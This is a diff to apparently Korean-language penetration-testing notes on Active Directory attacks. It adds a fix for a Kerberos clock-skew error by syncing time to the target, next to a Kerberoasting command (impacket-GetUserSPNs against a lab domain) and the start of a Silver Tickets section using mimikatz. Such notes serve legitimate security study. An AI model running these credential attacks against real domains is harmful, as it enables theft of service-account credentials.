@@ -56,6 +56,12 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 -   **-dc-ip** : 도메인 컨트롤러 IP.
 -   **corp.com/pete** : 인증에 사용할 도메인/사용자.
 ---
+# Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```bash
+sudo timedatectl set-ntp off
+sudo rdate -n [IP of Target]
+```
+---
 # Silver Tickets
 ``` powershell
 .\mimikatz.exe
